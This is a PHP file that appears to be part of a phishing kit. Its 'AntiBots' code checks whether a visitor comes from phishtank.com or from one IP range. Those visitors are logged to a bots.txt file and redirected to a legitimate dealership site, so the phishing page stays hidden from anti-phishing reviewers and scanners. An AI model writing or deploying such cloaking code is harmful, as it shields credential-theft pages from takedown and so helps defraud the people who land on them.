<?php

if(isset($_SERVER['HTTP_REFERER'])) {
 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com' ) {
 	$content = "AntiBots => ".$_SERVER['HTTP_REFERER']." [ phishtank ] \r\n";
    $save=fopen("../bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
    header("Location: https://www.superhonda.com/");
	exit();
	}
}
if(isset($_SERVER['HTTP_REFERER'])) {
 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
 	$content = "AntiBots => ".$_SERVER['HTTP_REFERER']." [ phishtank ] \r\n";
    $save=fopen("../bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
    header("Location:https://www.superhonda.com/");
	exit();
	}
}
$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

 if ($ip2long >= $range_start && $ip2long <= $range_end){
 	$content = "AntiBots => ".$_SERVER['HTTP_USER_AGENT']." [ phishtank ] \r\n";
    $save=fopen("../bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
    header("Location: https://www.superhonda.com/");
	exit();

 }
// https://safebrowsing.google.com/safebrowsing/report_phish/?hl=en
